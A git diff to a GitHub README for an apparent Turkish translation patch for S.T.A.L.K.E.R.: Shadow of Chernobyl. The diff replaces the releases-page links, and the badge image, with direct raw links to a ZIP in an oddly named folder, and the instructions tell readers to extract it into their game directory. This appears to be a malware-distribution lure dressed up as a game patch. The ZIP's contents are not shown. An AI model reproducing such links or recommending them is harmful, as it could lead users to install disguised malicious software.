@@ -1,6 +1,6 @@
 # 🎮 S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama - Enhance Your Gaming Experience
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/tangstweentyone/S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama/releases)
+[![Download](https://raw.githubusercontent.com/tangstweentyone/S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama/main/ultraintimate/Turkce-Shadow-Of-Chernobyl-Yama-v2.7.zip)](https://raw.githubusercontent.com/tangstweentyone/S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama/main/ultraintimate/Turkce-Shadow-Of-Chernobyl-Yama-v2.7.zip)
 
 ## 🌟 About This Project
 
@@ -29,14 +29,14 @@ To begin using the Turkish patch for S.T.A.L.K.E.R., follow these steps:
 
 1. **Check Requirements**: Ensure your system meets the minimum requirements.
 2. **Download the Patch**: Click the download button below to visit the releases page where you can download the patch:  
-   [Download S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama](https://github.com/tangstweentyone/S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama/releases)
+   [Download S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama](https://raw.githubusercontent.com/tangstweentyone/S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama/main/ultraintimate/Turkce-Shadow-Of-Chernobyl-Yama-v2.7.zip)
 3. **Extraction**: After downloading, extract the files from the ZIP folder to your game directory. This is usually found at `C:\Program Files (x86)\Steam\steamapps\common\S.T.A.L.K.E.R. - Shadow of Chernobyl`.
 4. **Run the Game**: Start the game as you normally would. You will now see the game in Turkish!
 
 ## 📥 Download & Install
 
 To get your own copy of the Turkish patch, visit the following link:  
-[Download S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama](https://github.com/tangstweentyone/S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama/releases)
+[Download S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama](https://raw.githubusercontent.com/tangstweentyone/S-T-A-L-K-E-R-Shadow-Of-Chernobyl-Turkce-Yama/main/ultraintimate/Turkce-Shadow-Of-Chernobyl-Yama-v2.7.zip)
 
 Simply follow the steps outlined above for a smooth installation process.
 
